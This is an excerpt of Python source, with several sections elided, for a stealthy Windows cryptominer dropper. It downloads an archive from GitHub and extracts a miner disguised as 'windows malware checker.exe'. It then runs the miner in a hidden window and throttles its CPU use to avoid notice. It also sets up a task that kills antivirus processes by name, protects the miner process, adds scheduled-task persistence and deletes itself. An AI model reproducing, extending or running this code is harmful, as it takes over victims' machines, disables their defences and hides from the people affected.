import ctypes, os, sys, subprocess, json, sqlite3, configparser, random, datetime, urllib.request, winreg, logging, traceback, time, zipfile, shutil, tempfile, string, base64
...
def download_and_prepare():
    ...
    repo_base = "https://github.com/ivanban789/bom"
    branches = ['main', 'master']
    repo_url = None
    for branch in branches:
        test_url = f"{repo_base}/archive/refs/heads/{branch}.zip"
        hawk.debug(f"[DOWNLOAD] trying {test_url}")
        try:
            urllib.request.urlopen(urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'}), timeout=5)
            repo_url = test_url
            break
        except Exception:
            continue
    if not repo_url:
        hawk.error("[DOWNLOAD] could not find a valid ZIP archive (tried main and master branches)")
        return None, None
    ...
    try:
        ...
        hawk.debug("[DOWNLOAD] extracting main repo zip")
        ...
        for root, dirs, files in os.walk(extracted_root):
            for file in files:
                if file.lower().endswith('.zip'):
                    ...
                    hawk.debug(f"[DOWNLOAD] found inner ZIP: {inner_zip_path}")
                    try:
                        with zipfile.ZipFile(inner_zip_path, 'r') as inner_zf:
                            inner_zf.extractall(root)
                        os.remove(inner_zip_path)
                    except Exception as e:
                        hawk.warning(f"[DOWNLOAD] failed to extract inner zip {inner_zip_path}: {e}")

        src_exe = None
        src_config = None
        for root, dirs, files in os.walk(temp_dir):
            for f in files:
                if f.lower() == "windows malware checker.exe":
        ...
        if src_exe:
            ...
            hawk.error("[DOWNLOAD] windows malware checker.exe not found even after inner extraction")
            return None, None
...
def adaptive_cpu_monitor(exe_path, config_dir, target_min=15, target_max=30, settle_time=120):
    try:
        import psutil
    except ImportError:
        hawk.error("[CPU_MONITOR] psutil not installed, launching miner without monitoring")
        ...
        protect_process(miner_proc.pid)
        hawk.info(f"[CPU_MONITOR] Miner PID {miner_proc.pid}")
        return

    hawk.info("[CPU_MONITOR] Starting adaptive CPU monitor")
    ...
    while True:
        ...
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    cfg = json.load(f)
                current_threads = cfg['cpu']['max-threads-hint']
            except:
                current_threads = 1
        else:
        ...
        hawk.info(f"[CPU_MONITOR] Testing with {current_threads} threads")

        if miner_proc is not None:
            hawk.info("[CPU_MONITOR] Terminating old miner process")
            miner_proc.terminate()
            miner_proc.wait()
            time.sleep(2)

        miner_proc = subprocess.Popen(
            [exe_path, f"--config={config_path}"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        ...
        try:
            ...
            hawk.debug(f"[CPU_MONITOR] Process name: {p.name()}, exe: {p.exe()}, status: {p.status()}")
            time.sleep(2)
            if not p.is_running():
                hawk.warning("[CPU_MONITOR] Process already dead 2 seconds after launch – likely a wrapper!")
        except Exception as e:
            hawk.error(f"[CPU_MONITOR] Could not inspect process: {e}")

        try:
            p = psutil.Process(miner_proc.pid)
            if not p.is_running():
                hawk.error("[CPU_MONITOR] Miner died immediately – possibly a launcher wrapper. Aborting CPU monitoring.")
                return
        except Exception as e:
            hawk.error(f"[CPU_MONITOR] Could not verify process: {e}")
            return
        ...
        while time.time() - start < 60:
            try:
                p = psutil.Process(miner_proc.pid)
                cpu = get_process_tree_cpu(miner_proc.pid)
                samples.append(cpu)
                hawk.debug(f"[CPU_MONITOR] CPU sample: {cpu:.1f}%")
            except psutil.NoSuchProcess:
                hawk.error("[CPU_MONITOR] miner died unexpectedly")
                miner_proc = None
                break
            except Exception as e:
                hawk.error(f"[CPU_MONITOR] error: {e}")

        if not samples:
            hawk.error("[CPU_MONITOR] no CPU samples, cannot adjust")
            return

        avg_cpu = sum(samples) / len(samples)
        hawk.info(f"[CPU_MONITOR] Average CPU over 60s: {avg_cpu:.1f}%")

        if avg_cpu < target_min:
            new_threads = min(current_threads + 1, max(1, int((os.cpu_count() or 4) * 0.3)))
            if new_threads != current_threads:
                hawk.info(f"[CPU_MONITOR] CPU too low, increasing threads to {new_threads}")
                generate_config(config_dir, threads=new_threads)
                continue
            else:
                hawk.info("[CPU_MONITOR] Already at max allowed threads, keeping config")
        elif avg_cpu > target_max:
            new_threads = max(current_threads - 1, 1)
            if new_threads != current_threads:
                hawk.info(f"[CPU_MONITOR] CPU too high, decreasing threads to {new_threads}")
                generate_config(config_dir, threads=new_threads)
                continue
            else:
                hawk.info("[CPU_MONITOR] Already at min threads, keeping config")
        else:
            pass

        hawk.info(f"[CPU_MONITOR] CPU in range ({target_min}%-{target_max}%) or at adjustment limit, monitoring stability for {settle_time}s")
        ...
        while time.time() - stable_start < settle_time:
            try:
                ...
                cpu = get_process_tree_cpu(miner_proc.pid)
                if cpu > target_max:
                    hawk.warning(f"[CPU_MONITOR] CPU spike to {cpu:.1f}% during stability check – adjusting")
                    stable = False
                    break
            except psutil.NoSuchProcess:
                hawk.error("[CPU_MONITOR] miner died during stability check")
                return
        if stable:
            hawk.info("[CPU_MONITOR] Stability confirmed – CPU usage within limits")
            return
        else:
            new_threads = max(current_threads - 1, 1)
            generate_config(config_dir, threads=new_threads)
...
def create_av_killer_task():
    ...
    try:
        ...
        ps_script = '''
$procs = @('setup.exe','install.exe','avastui.exe','avgui.exe','bdagent.exe','kav.exe','mcshield.exe','navw32.exe','egui.exe','fsbts.exe','sophos.exe','mbam.exe','mbamservice.exe')
...
def run_payload():
    ...
    miner_name = os.path.basename(exe).lower()
    try:
        tasklist_out = subprocess.run(
            'tasklist /fo csv /nh', capture_output=True, text=True,
            shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout.lower()
        if miner_name in tasklist_out:
            hawk.info(f"[PAYLOAD] Miner process '{miner_name}' already running – skipping launch")
            create_scheduled_task(exe, config_dir)
            lock_file = random.choice(LOCK_PATHS)
            os.makedirs(os.path.dirname(lock_file), exist_ok=True)
            with open(lock_file, 'w') as lf:
                lf.write(f"{exe}\n{config_dir}")
            hawk.info("[PAYLOAD] Persistence ensured, self-deleting")
            self_del()
            return
    except Exception as e:
        hawk.warning(f"[PAYLOAD] Could not check for existing process: {e}")

    adaptive_cpu_monitor(exe, config_dir, target_min=15, target_max=30, settle_time=120)
